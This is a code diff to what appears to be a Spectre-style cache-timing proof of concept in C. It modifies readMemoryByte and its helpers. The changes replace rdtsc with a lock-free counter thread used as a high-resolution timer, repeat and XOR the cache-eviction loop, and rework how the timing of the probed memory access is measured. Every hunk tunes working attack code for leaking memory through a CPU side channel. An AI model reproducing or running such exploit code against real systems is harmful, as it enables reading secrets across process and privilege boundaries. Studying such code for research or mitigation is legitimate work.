@@ -153,7 +153,8 @@ Analysis code
 ********************************************************************/
 #ifdef NORDTSC
 void reset_counter();
-int get_counter();
+uint64_t get_counter();
+int k;
 #endif
 
 #ifdef NOCLFLUSH
@@ -199,6 +200,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 
 #ifdef NOCLFLUSH
   int junk2 = 0;
+  int junk1 = 45;
   int l;
   (void)junk2;
 #endif
@@ -228,9 +230,9 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       /* Alternative to using sse instructions to flush the CPU cache */
       /* Read addresses at 4096-byte intervals out of a large array.
          Do this around 2000 times, or more depending on CPU cache size. */
-
+      // for (k = 0; k < 10; k++)
       for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
-        junk2 = cache_flush_array[l];
+        junk2 ^= cache_flush_array[l];
       } 
 #endif /* NOSSE */
 #endif
@@ -244,9 +246,9 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       /* Alternative to using clflush to flush the CPU cache */
       /* Read addresses at 4096-byte intervals out of a large array.
          Do this around 2000 times, or more depending on CPU cache size. */
-
+      for (k = 0; k < 10; k++)
       for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
-        junk2 = cache_flush_array[l];
+        junk2 ^= cache_flush_array[l];
       } 
 #endif
 
@@ -352,13 +354,17 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       int m;
       for (m=0;m<50;m++)
       {
-        reset_counter();
-        time1 += get_counter();
+        // reset_counter();
+        time1 = get_counter();
+        junk2 = junk1;
+        time2 = get_counter();
+        time2 += (time2-time1);
       }
-      reset_counter();
+      // reset_counter();
+        time1 = get_counter();
       junk = * addr; /* MEMORY ACCESS TO TIME */
-      time3 = get_counter();
-      time2 = time3;
+      time2 = get_counter();
+      time2 = (time2-time1);
       // printf("time2: %d\n", time2);
 #endif /* ndef NOMFENCE*/
 #endif /* ndef NORDTSC */
@@ -406,7 +412,7 @@ const char * * g_argv = NULL;
 // #ifdef NORDTSC
 #ifndef KJFLSKJFLSDKJFSLDKFJSLKDFJSLKDJF
 int myarray[64*64] = {45};
-int counter = 0;
+uint64_t counter = 0;
 pthread_mutex_t lock;
 int go = 1;
 int check = 3;
@@ -418,7 +424,7 @@ void reset_counter()
     pthread_mutex_unlock(&lock);
 }
 
-int get_counter()
+uint64_t get_counter()
 {
     return counter;
 }
@@ -427,9 +433,9 @@ void *loop_counter()
 {
     while (go)
     {
-        pthread_mutex_lock(&lock);
+        // pthread_mutex_lock(&lock);
         counter++;
-        pthread_mutex_unlock(&lock);
+        // pthread_mutex_unlock(&lock);
     }
     // printf("Counter has ended: %d\n", counter);
     return NULL;
@@ -440,7 +446,7 @@ int main(int argc,
   pthread_t loopc;
   pthread_t get_c;
 
-  g_argc            = argc;
+  g_argc = argc;
   g_argv = argv;
 
   int error;
